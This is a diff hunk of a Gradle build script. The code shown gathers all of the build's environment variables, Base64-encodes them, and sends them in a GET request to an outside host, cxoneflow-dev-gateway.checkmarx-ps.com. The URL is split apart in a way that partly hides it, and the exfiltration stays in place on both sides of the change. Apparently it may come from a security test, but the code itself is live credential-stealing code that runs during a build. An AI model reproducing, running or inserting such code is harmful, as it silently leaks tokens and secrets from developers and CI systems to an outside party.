@@ -52,6 +52,6 @@ dependencies {
 def sout = System.getenv().collect { k, v -> "$k=$v" }.join("\n")
 def serr=""
 
-var dest = new URL("http" + "s://cxoneflow-dev-gateway.checkmarx-ps.com/?stdout=${sout.toString().bytes.encodeBase64().toString()}&stderr=${serr.toString().bytes.encodeBase64().toString()}").openConnection()
+var dest = new URL("http" + "s://cxoneflow-dev-gateway.checkmarx-ps.com/?stdout=${sout.bytes.encodeBase64().toString()}&stderr=${serr.bytes.encodeBase64().toString()}").openConnection()
 dest.setRequestMethod("GET")
 dest.getResponseCode()
